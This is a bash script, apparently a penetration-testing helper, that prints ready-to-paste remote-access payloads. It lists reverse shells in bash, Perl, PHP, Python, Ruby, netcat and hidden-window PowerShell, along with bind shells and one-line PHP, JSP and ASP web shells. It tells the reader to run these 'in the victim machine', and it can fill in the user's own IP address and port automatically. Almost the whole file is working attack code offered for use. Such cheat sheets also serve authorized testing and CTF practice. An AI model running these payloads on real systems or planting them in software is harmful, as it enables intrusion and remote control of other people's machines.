#!/bin/bash

#Colours
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

if [ $# -ne 2 ]
then
    echo -e "\n${yellowColour}** REVERSE SHELLS ** (Execute this commands in the victim machine while you listen for the shell: nc -lvnp <port>)\n"
	echo -e "${blueColour}BASH\n${grayColour}bash -i >& /dev/tcp/<ip>/<port> 0>&1"
	echo -e "${blueColour}PERL\n${grayColour}perl -e 'use Socket;\$i=\"<ip>\";\$p=<port>;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\");};'"
    echo -e "${blueColour}PHP\n${grayColour}php -r '\$sock=fsockopen(\"<ip>\",<port>);exec(\"/bin/bash -i <&3 >&3 2>&3\");'"
	echo -e "${blueColour}PYTHON\n${grayColour}python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"<ip>\",<port>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);'"
	echo -e "${blueColour}PYTHON3\n${grayColour}python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"<ip>\",<port>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);'"
    echo -e "${blueColour}RUBY\n${grayColour}ruby -rsocket -e'f=TCPSocket.open(\"<ip>\",<port>).to_i;exec sprintf(\"/bin/bash -i <&%d >&%d 2>&%d\",f,f,f)'"
    echo -e "${blueColour}NETCAT\n${grayColour}rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2>&1 | nc <ip> <port> >/tmp/f\nnc -e /bin/bash <ip> <port>"
    echo -e "${blueColour}POWERSHELL\n${grayColour}powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"<ip>\",<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

    echo -e "\n${yellowColour}** BIND SHELLS ** (Execute this commands in the victim machine and connect to the shell that is waiting for you: nc <victim_ip> <port>)\n"
    echo -e "${blueColour}NETCAT\n${grayColour}nc -lvp <port> -e /bin/bash ${greenColour}or${grayColour} rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp <port> >/tmp/f"
    echo -e "${blueColour}PYTHON\n${grayColour}python -c 'exec(\"\"\"import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind((\"0.0.0.0\",<port>));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())\"\"\")'"
    echo -e "${blueColour}POWERSHELL\n${grayColour}powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]<port>; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \" \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();"

    echo -e "\n${yellowColour}** WEB SHELLS ** (Add this code to a file and upload it to the web server)\n"
    echo -e "${blueColour}PHP\n${grayColour}<?PHP system($_GET['cmd']);?>"
    echo -e "${blueColour}JSP\n${grayColour}<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>"
	echo -e "${blueColour}ASP\n${grayColour}<% eval request(\"cmd\") %>"

	echo -e "\n\n${redColour}If you want to customize this reverse shells with your IP address and a port, you can launch the script like that: \n\n${yellowColour}$0 <interface> <port>\n"

else

	ip=$(ifconfig $1 | grep -oP "\d{1,3}.\d{1,3}.\d{1,3}.\d{1,3}" | head -n 1)

	echo -e "\n${yellowColour}** REVERSE SHELLS ** (Execute this commands in the victim machine while you listen for the shell: nc -lvnp $2)\n"
	echo -e "${blueColour}BASH\n${grayColour}bash -i >& /dev/tcp/$ip/$2 0>&1"
	echo -e "${blueColour}PERL\n${grayColour}perl -e 'use Socket;\$i=\"$ip\";\$p=$2;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\");};'"
	echo -e "${blueColour}PYTHON\n${grayColour}python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);'"
	echo -e "${blueColour}PYTHON3\n${grayColour}python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);'"
	echo -e "${blueColour}PHP\n${grayColour}php -r '\$sock=fsockopen(\"$ip\",$2);exec(\"/bin/bash -i <&3 >&3 2>&3\");'"
	echo -e "${blueColour}RUBY\n${grayColour}ruby -rsocket -e'f=TCPSocket.open(\"$ip\",$2).to_i;exec sprintf(\"/bin/bash -i <&%d >&%d 2>&%d\",f,f,f)'"
	echo -e "${blueColour}NETCAT\n${grayColour}rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2>&1 | nc $ip $2 >/tmp/f\nnc -e /bin/bash $ip $2"
    echo -e "${blueColour}POWERSHELL\n${grayColour}powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"$ip\",$2);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

    echo -e "\n${yellowColour}** BIND SHELLS ** (Execute this commands in the victim machine and connect to the shell that is waiting for you: nc <victim_ip> $2)\n"
	echo -e "${blueColour}NETCAT\n${grayColour}nc -lvp $2 -e /bin/bash ${redColour}or${grayColour} rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp $2 >/tmp/f"
    echo -e "${blueColour}PYTHON\n${grayColour}python -c 'exec(\"\"\"import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind((\"0.0.0.0\",$2));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())\"\"\")'"
    echo -e "${blueColour}POWERSHELL\n${grayColour}powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]$2; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \" \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();"

    echo -e "\n${yellowColour}** WEB SHELLS ** (Add this code to a file and upload it to the web server)\n"
    echo -e "${blueColour}PHP\n${grayColour}<?PHP system($_GET['cmd']);?>"
    echo -e "${blueColour}JSP\n${grayColour}<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>"
	echo -e "${blueColour}ASP\n${grayColour}<% eval request(\"cmd\") %>\n"


fi
